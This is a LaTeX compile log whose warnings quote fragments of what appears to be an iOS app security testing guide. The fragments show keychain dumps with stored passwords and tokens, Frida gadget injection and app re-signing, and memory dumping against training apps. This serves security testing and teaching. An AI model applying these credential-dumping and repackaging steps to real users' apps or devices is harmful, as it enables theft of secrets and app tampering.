<use  "/tmp/tex2pdf.-b81d3c9506d190f0/67df79153b351160650e3671f95ec4d358cdb42e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/66f4454a50ab09521142216735c12da384b6ebe1.
png" > [544]
Overfull \hbox (12.32903pt too wide) in paragraph at lines 32008--32008
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  ----------------------------[] 
[545]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/24668459a85228c7fd3205ac60e616120c5fa265.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5a8b4b5da9d5f0e362687fe04a7d34d52f468738.
png" > [546]
Overfull \hbox (99.92937pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Bundle: /private/var/containers/Bundle/Applica
tion/3ADAF47D-A734-49FA-B274-FBCA66589E67[] 

Overfull \hbox (237.89934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Application: /private/var/containers/Bundle/Ap
plication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (119.63934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Data: /private/var/mobile/Containers/Data/Appl
ication/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 
[547]
Overfull \hbox (248.84866pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 -----------------  ---------------------------
----------------------------------------------------------------[] 

Overfull \hbox (207.23938pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 BundlePath         /var/containers/Bundle/Appl
ication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (244.46931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 CachesDirectory    /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches[] 

Overfull \hbox (215.99931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 DocumentDirectory  /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents[] 

Overfull \hbox (200.66934pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 LibraryDirectory   /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library[] 

Overfull \hbox (134.17004pt too wide) in paragraph at lines 32098--32101
[]\TU/SourceSansPro(0)/m/n/10.95 The Bundle directory (\TU/SourceCodePro(6)/m/n
/10.95 /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (155.42393pt too wide) in paragraph at lines 32101--32103
[]\TU/SourceSansPro(0)/m/n/10.95 The Data directory (\TU/SourceCodePro(6)/m/n/1
0.95 /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB06
93/\TU/SourceSansPro(0)/m/n/10.95 ). 
[548]
Overfull \hbox (120.74524pt too wide) in paragraph at lines 32229--32232
\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 /var/containers/
Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\TU/Sour
ceSansPro(0)/m/n/10.95 ): 

Overfull \hbox (78.02895pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  --------------------------------------[] 
[549]
Overfull \hbox (14.51958pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 Regular           420  None                ...
  archived-expanded-entitlements.xcent[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/64430942f835261b3d5dda4b1a015f93a37444a5.
png" > [550]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/527c1334c8624ced36aea25f510ec6b9d3af0927.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" > [551]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/277e652a44a38783e21eb7c8b9f08bc1ec9ea888.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/80296790f84b6f892c5600d3679bf94df59a5303.
png" > [552]
Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone chmod[9705] <Notice>: M
S:Notice: Injecting: (null) [chmod] (1556.00)[] 

Overfull \hbox (143.7294pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone readlink[9706] <Notice>
: MS:Notice: Injecting: (null) [readlink] (1556.00)[] 

Overfull \hbox (64.88942pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:N
otice: Injecting: (null) [rm] (1556.00)[] 

Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone touch[9708] <Notice>: M
S:Notice: Injecting: (null) [touch] (1556.00)[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/962e8ecc0cf25f4714db0758530228fcd0c6d54e.
png" > [553]
Overfull \hbox (3.56946pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Note: You may be asked to authenticate using t
he devices passcode or TouchID[] 
[554]
Overfull \hbox (187.52988pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Created                    Accessible         
             ACL    Type      Account              Service                     
Data[] 

Overfull \hbox (785.39812pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 -------------------------  -------------------
-----------  -----  --------  -------------------  --------------------------  
----------------------------------------------------------------------[] 

Overfull \hbox (351.77951pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:09 +0000  WhenUnlocked       
             None   Password  keychainValue        com.highaltitudehacks.dvia  
mypassword123[] 

Overfull \hbox (408.71944pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  WhenUnlockedThisDev
iceOnly      None   Password  SCAPILazyVector      com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (426.2394pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  fideliusDeviceGraph  com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (767.87929pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenKey2    com.toyopagroup.picaboo     
00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh[] 

Overfull \hbox (601.4393pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenValue2  com.toyopagroup.picaboo     
CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=[] 

Overfull \hbox (520.40927pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Pulling: /private/var/containers/Bundle/Ap
plication/92E7C59C-2F0B-47C5-94B7-DCF506DBEB34/iGoat-Swift.app/Info.plist -> /U
sers/razr/.needle/tmp/plist[] 

Overfull \hbox (69.26945pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Setting up local port forwarding to enable
 communications with the Frida server...[] 
[555]
Overfull \hbox (18.89938pt too wide) in paragraph at lines 32481--32481
[]    \TU/SourceCodePro(6)/m/n/10.95 "Data": " (UTF8 String: []CJ8Y8K2oE3rhOFUh
nxJxDS1Zp8Z25XzgY2EtFyMbW3U=[])",[] 

Overfull \hbox (71.45938pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /Users/razr/.needle
/output/frida_script_dump_keychain.txt[] 

Underfull \hbox (badness 4132) in paragraph at lines 32483--32485
[]\TU/SourceSansPro(0)/m/n/10.95 Note that currently only the \TU/SourceCodePro
(6)/m/n/10.95 keychain_dump_frida \TU/SourceSansPro(0)/m/n/10.95 module works o
n iOS 12, but not the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0a5a8632266244b98216ae2ffb8a6a773b9dbb6d.
png" > [556] [557]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ddd41202821c8a781630622193411ffb54d0ff1.
png" > [558] [559]
Underfull \hbox (badness 10000) in paragraph at lines 32714--32717
[]\TU/SourceSansPro(0)/m/n/10.95 Information Property List - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 32717--32719
[]\TU/SourceSansPro(0)/m/n/10.95 UIDeviceFamily - [][]$[][][][][] [] [] [] [][]
[][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [
][][][][][][][][][][][][] [] [][][][][][][] []

Overfull \hbox (1.05821pt too wide) in paragraph at lines 32717--32719
[][][][][][][][][] [] [][][][][][][][][][][][][][][][][][][][][] [] [][][][][][
][][] [] [][][][][][][][][][][][] [] [][][][] [] [] [] [][][][][] [] [][][] [] 
[][][] [] [][][] [] [][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32735--32738
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump - [][]$[][][][][] [] [] [] [][][][]
[][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] [][]
 [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32738--32741
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump-z - [][]$[][][][][] [] [] [] [][][]
[][][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] []
[] [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][
]
[560] [561] [562] [563]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7670982e5e0675cd414876d6c2505da3b7519c33.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6ae07a22cc86ccf206cc62961a54d037a436add3.
png" > [564] [565]
Overfull \hbox (253.22957pt too wide) in paragraph at lines 33044--33044
[]  \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECUT
E    38       4292   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE[
] 

Overfull \hbox (270.74953pt too wide) in paragraph at lines 33044--33044
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       4856   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE
[] 

Overfull \hbox (7.94943pt too wide) in paragraph at lines 33054--33054
[]\TU/SourceCodePro(6)/m/n/10.95 iOS8-jailbreak:~ root# lipo -thin armv7 DamnVu
lnerableIOSApp -output DVIA32[] 

Overfull \hbox (286.0793pt too wide) in paragraph at lines 33066--33066
[]\TU/SourceCodePro(6)/m/n/10.95 @interface FlurryUtil : ./DVIA/DVIA/DamnVulner
ableIOSApp/DamnVulnerableIOSApp/YapDatabase/Extensions/Views/Internal/[] 
[566]
Underfull \hbox (badness 2591) in paragraph at lines 33125--33133
[]\TU/SourceSansPro(0)/m/n/10.95 In addition to the techniques learned in the “
[][]Disassembling and Decompiling[][]” section, for this

Underfull \hbox (badness 1389) in paragraph at lines 33125--33133
\TU/SourceSansPro(0)/m/n/10.95 section you’ll need some understanding of the []
[]Objective-C runtime[][]. For instance, functions like

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58dbf28ff380c5c9e7a07711dd5b2f67ac2448ce.
png" > [567]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6e69c2562dd8593aead2a562db4a760b9647d1f9.
png" > [568] [569]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/12bde274c195d950e097030a4d940aa69ef599dc.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d3aa388017c64db3d09718bc6afdc1b49657d0a1.
png" > [570] [571]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4fa0bcc01f6c81e1c689a905d989b9ce170cd436.
png" > [572] [573]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3aa39770f872dc479a47edc037663d4dd7117ffe.
png" > [574] [575]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/07ef2bb02fa4cf9a0fd9f84179a1244d413cb209.
png" > [576] [577]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65bd1b73aeaa3a7034682bc1d4b2c3b203ad8d79.
png" > [578] [579] [580]
Overfull \hbox (167.8194pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "
iPhone Distribution: Vantage Point Security Pte. Ltd."[] 

Overfull \hbox (126.20938pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 2) 8004380F331DCA22CC1B47FB1A805890AE41C938 "
iPhone Developer: Bernhard Müller (RV852WND79)"[] 
[581]
Overfull \hbox (262.93832pt too wide) in paragraph at lines 33525--33535
\TU/SourceSansPro(0)/m/n/10.95 home directory: \TU/SourceCodePro(6)/m/n/10.95 ~
/Library/Developer/Xcode/DerivedData/<ProjectName>/Build/Products/Debug-iphoneo
s/<ProjectName>.app/\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (91.16939pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -x -c []Print :Entit
lements[] profile.plist > entitlements.plist[] 

Overfull \hbox (187.52934pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[582]
Overfull \hbox (73.64941pt too wide) in paragraph at lines 33600--33600
[]\TU/SourceCodePro(6)/m/n/10.95 $ ln -s <your-path-to-ios-deploy>/build/Releas
e/ios-deploy /usr/local/bin/ios-deploy[] 
[583]
Overfull \hbox (505.07933pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3   20614
4 189774 /private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1
FA105A23A/iOweApp.app/iOweApp[] 

Overfull \hbox (1059.14919pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3     549
2 213230 /private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2
B-972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C
5224537F7F23DF19314CF6FD8AA.closure[] 

Overfull \hbox (207.23941pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3    3062
8 212198 /private/var/preferences/Logging/.plist-cache.vqXhr1EE[] 

Overfull \hbox (75.83948pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2    5008
0 234433 /usr/lib/libobjc-trampolines.dylib[] 

Overfull \hbox (161.24944pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2   34420
4  74185 /System/Library/Fonts/AppFonts/ChalkboardSE.ttc[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   31u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   42u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 
[584]
Underfull \hbox (badness 1762) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 use it for attaching, stepping or continuing the
 process but they cannot use it to read or write

Underfull \hbox (badness 1997) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 Mach IPC interface API functions to perform acti
ons such as suspending the target process and

Underfull \hbox (badness 1881) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 reading/writing register states (\TU/SourceCodeP
ro(6)/m/n/10.95 thread_get_state\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceCodeP
ro(6)/m/n/10.95 thread_set_state\TU/SourceSansPro(0)/m/n/10.95 ) and virtual me
mory

Overfull \hbox (371.48932pt too wide) in paragraph at lines 33749--33749
[]\TU/SourceCodePro(6)/m/n/10.95 /Applications/Xcode.app/Contents/Developer/Pla
tforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.
dmg[] 
[585] [586] [587] [588]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ebc00f60d8d1aad4169130902c075b6da5552d9c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2232357dcab82a2afd5c51a6eeb185b4f7f281e9.
png" > [589]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3b0e5e3a2b9e0460b87f2fd5e167803aa68278f.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aafba1daf9b3c7d33c63306630e1ad7c2adea156.
png" > [590] [591]
Overfull \hbox (229.13936pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isMusicStoreURL]: Loaded handler at "/
Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js"[] 

Overfull \hbox (202.85934pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isAppStoreURL]: Loaded handler at "/Us
ers/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js"[] 

Overfull \hbox (150.29941pt too wide) in paragraph at lines 34073--34073
[] \TU/SourceCodePro(6)/m/n/10.95 21324 ms     | -[NSURLRequest initWithURL:0x1
06388b00 cachePolicy:0x0 timeoutInterval:0x106388b80[] 
[592]
Underfull \hbox (badness 5374) in paragraph at lines 34144--34150
\TU/SourceSansPro(0)/m/n/10.95 a point where performing further manual analysis
 was cumbersome. The function at offset
[593]
Underfull \hbox (badness 2103) in paragraph at lines 34171--34174
[]\TU/SourceSansPro(0)/m/n/10.95 Pass the above \TU/SourceCodePro(6)/m/n/10.95 
callable \TU/SourceSansPro(0)/m/n/10.95 object to the concrete execution engine
, which in this case is
[594]
Overfull \hbox (316.73938pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 $ optool install -c load -p "@executable_path/
FridaGadget.dylib"  -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1[
] 

Overfull \hbox (14.51944pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 Writing executable to Payload/UnCrackable Leve
l 1.app/UnCrackable Level 1...[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 34267--34267
[]\TU/SourceCodePro(6)/m/n/10.95 $ cp AwesomeRepackaging.mobileprovision Payloa
d/UnCrackable\ Level\ 1.app/embedded.mobileprovision[] 

Overfull \hbox (334.25934pt too wide) in paragraph at lines 34276--34276
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -c "Set :CFBundleIde
ntifier sg.vantagepoint.repackage" Payload/UnCrackable\ Level\ 1.app/Info.plist
[] 
[595]
Overfull \hbox (353.9693pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938  Payload/UnCrackable\ Level\ 1.app/FridaGadget.dy
lib[] 

Overfull \hbox (38.6094pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/FridaGadget.dy
lib: replacing existing signature[] 

Overfull \hbox (590.48926pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/UnCrack
able\ Level\ 1.app/UnCrackable\ Level\ 1[] 

Overfull \hbox (47.36943pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/UnCrackable Le
vel 1: replacing existing signature[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/94b4595a116ad9f96b949066605079edc2104eb6.
png" > [596]
Overfull \hbox (231.49368pt too wide) in paragraph at lines 34344--34349
[]\TU/SourceSansPro(0)/m/n/10.95 At installation time, the application archive 
is unpacked into the folder \TU/SourceCodePro(6)/m/n/10.95 /private/var/contain
ers/Bundle/Application/[GUID]/[APP].app

Overfull \hbox (46.50075pt too wide) in paragraph at lines 34387--34390
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it into the ori
ginal \TU/SourceCodePro(6)/m/n/10.95 Payload/[APP].app/main.jsbundle
[597]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 34468--34468
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://cydia.saurik.com/api/latest/3 -
O cycript.zip && unzip cycript.zip[] 
[598]
Overfull \hbox (80.21939pt too wide) in paragraph at lines 34489--34489
[]\TU/SourceCodePro(6)/m/n/10.95 501 78 1 0 0:00.00 ?? 0:10.57 /System/Library/
CoreServices/SpringBoard.app/SpringBoard[] 

Overfull \hbox (583.91928pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 cy# alertView = [[UIAlertView alloc] initWithT
itle:@"OWASP MSTG" message:@"Mobile Security Testing Guide"  delegate:nil cance
lButtonitle:@"OK" otherButtonTitles:nil][] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 #"<UIAlertView: 0x1645c550; frame = (0 0; 0 0)
; layer = <CALayer: 0x164df160>>"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f891e21426c16da3312771ade698d40bf018f411.
png" > [599]
Overfull \hbox (198.47935pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 cy# [[NSFileManager defaultManager] URLsForDir
ectory:NSDocumentDirectory inDomains:NSUserDomainMask][0][] 

Overfull \hbox (161.24933pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 #"file:///var/mobile/Containers/Data/Applicati
on/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/"[] 
[600] [601]
Overfull \hbox (12.32939pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/System/Library/Frameworks/CoreFoundation
.framework/CoreFoundation": [[] 

Overfull \hbox (229.13933pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/private/var/containers/Bundle/Applicatio
n/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp": [[] 
[602]
Overfull \hbox (286.07935pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/private/var/containers/Bundl
e/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp",[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/System/Library/Frameworks/Fo
undation.framework/Foundation",[] 
[603] [604]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6a60765ca34ee9e713a1c08bd8506a2ef18541bf.
png" > [605] [606] [607]
Underfull \hbox (badness 1400) in paragraph at lines 34866--34870
\TU/SourceSansPro(0)/m/n/10.95 main app binary iGoat-Swift is located at \TU/So
urceCodePro(6)/m/n/10.95 0x0000000100b7c000 \TU/SourceSansPro(0)/m/n/10.95 and 
the Realm Framework at

Overfull \hbox (483.17842pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 --------------------------------  ----------- 
 --------------------  --------------------------------------------------------
----------------------[] 

Overfull \hbox (426.23946pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 iGoat-Swift                       0x100b7c000 
 2506752 (2.4 MiB)     /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B2
74-FBCA66589E67/iGo...[] 

Overfull \hbox (95.54951pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 TweakInject.dylib                 0x100eb4000 
 16384 (16.0 KiB)      /usr/lib/TweakInject.dylib[] 

Overfull \hbox (445.94937pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 SystemConfiguration               0x1862c0000 
 446464 (436.0 KiB)    /System/Library/Frameworks/SystemConfiguration.framework
/SystemConfiguratio...[] 

Overfull \hbox (73.64952pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 libc++.1.dylib                    0x1847c0000 
 368640 (360.0 KiB)    /usr/lib/libc++.1.dylib[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 34909--34913
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[608] [609]
Overfull \hbox (29.84941pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone on (iPhone: 10.3.1) [usb] # memory dump
 all /Users/foo/memory_iOS/memory[] 

Overfull \hbox (75.83943pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 768.0 KiB from base: 0x1ad200000  [###
#################################]  100%[] 
[610]
Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 

Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 
[611] [612] [613]
Overfull \hbox (12.32951pt too wide) in paragraph at lines 35249--35249
[]\TU/SourceCodePro(6)/m/n/10.95 │       │   0x18eec5ca2      02aa9b494197   ad
d ch, byte [rdx - 0x68beb665] ; arg3[] 
[614]
Underfull \hbox (badness 2343) in paragraph at lines 35306--35309
[]\TU/SourceSansPro(0)/m/n/10.95 iOS Instrumentation without Jailbreak - [][]$[
][][][][] [] [] [] [][][] [] [][][][][][][][] [] [][][][][] [] [][] [] [][][][]
[] [][] [][] [] [][][][][][][][] [][]
[615]
Underfull \hbox (badness 10000) in paragraph at lines 35363--35366
[]\TU/SourceSansPro(0)/m/n/10.95 OWASP UnCrackable Apps for iOS - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][] [][][][] []
 [][][][] [] [][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35370--35373
[]\TU/SourceSansPro(0)/m/n/10.95 Reverse Engineering tools for iOS Apps - [][]$
[][][][] [] [] [] [][][][][][][][][][][][][] [] [][][] [] [][][][][] [] [][][] 
[] [][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35375--35377
[]\TU/SourceSansPro(0)/m/n/10.95 Xcode command line developer tools - [][]$[][]
[][][] [] [] [] [][][][][][][][][] [] [][][][][][] [] [][] [] [][][][][] [][] [
][][][][][][] [][] [][][][] [][]
[616]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/153fa4a61498a02f5937730470fadbf4339e20ac.
jpg" > [617] [618]
Underfull \hbox (badness 10000) in paragraph at lines 35554--35556
[]\TU/SourceCodePro(6)/m/n/10.95 AccessControlFlags \TU/SourceSansPro(0)/m/n/10
.95 define the mechanisms with which users can authenticate the key

Overfull \hbox (164.11397pt too wide) in paragraph at lines 35576--35581
[]\TU/SourceSansPro(0)/m/n/10.95 Please note that keys secured by Touch ID (via
 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro(
0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrent
Set\TU/SourceSansPro(0)/m/n/10.95 )
[619]
